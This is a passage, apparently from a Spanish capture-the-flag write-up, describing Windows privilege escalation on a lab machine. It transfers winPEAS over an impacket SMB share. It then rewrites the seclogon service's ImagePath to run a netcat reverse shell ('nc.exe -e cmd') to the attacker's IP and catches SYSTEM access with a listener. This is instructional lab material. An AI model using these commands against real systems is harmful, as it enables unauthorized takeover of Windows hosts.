## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
whoami /priv
```

Como no tenemos posibilidades de escalar privilegios con un seImpersonatePrivilege por ejemplo, vamos a tener que enumerar el systema

```bash
cd C:\Windows\Temp
mkdir privesc
```

Descargamos el [**Winpeas.exe**](https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).
Cancelamos el recurso smb y creamos un nuevo para transferir el fichero.

```bash
mv /home/s4vitar/Descargas/winPEASx64.exe ./winpeas.exe
impacket-smbserver smbFolderr $(pwd) -smb2support -username s4vitar -password s4vitar123
```

y lo transferimos a la maquina victima

```bash
net use y: \\10.10.14.15\smbFolderr /user:s4vitar s4vitar123
copy y:\winpeas.exe winpeas.exe
dir
winpeas.exe
```

El winpeas.exe nos reporta que el usuario Hector tiene fullControl sobre bastante servicios, uno de ellos es el seclogon.


```{r, echo = FALSE, fig.cap="Hector service fullControl", out.width="90%"}
    knitr::include_graphics("images/Control-Hector-services-fullControl.png")
```

Si lanzamos el commando `sc query seclogon` vemos que el servicio esta apagado pero podriamos lanzarlo configurando la manera que queremos que arranque.

```bash
reg query "HKLM\system\currentcontrolset\services\seclogon"
```

```{r, echo = FALSE, fig.cap="service seclogon reg-expand-sz", out.width="90%"}
    knitr::include_graphics("images/Control-reg_expand_sz.png")
```

La idea aqui es que el **ImagePath**, mejor dicho el svchost.exe se ejecuta directamente a la hora que lanzamos el servicio y este binario esta ejecutado
por el usuario administrador. La idea aqui es tomar el control del **ImagePath** para que valga otra cosa.

```bash
reg add "HKLM\system\currentcontrolset\services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.15 443" /f
```

Ya podemos comprobar con el commando `reg query "HKLM\system\currentcontrolset\services\seclogon"` que el ImagePath a sido cambiado.

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. arrancamos el servicio

    ```bash
    sc start seclogon
    ```

ya hemos ganado accesso al systema como `nt authority\system` y podemos leer la flag.
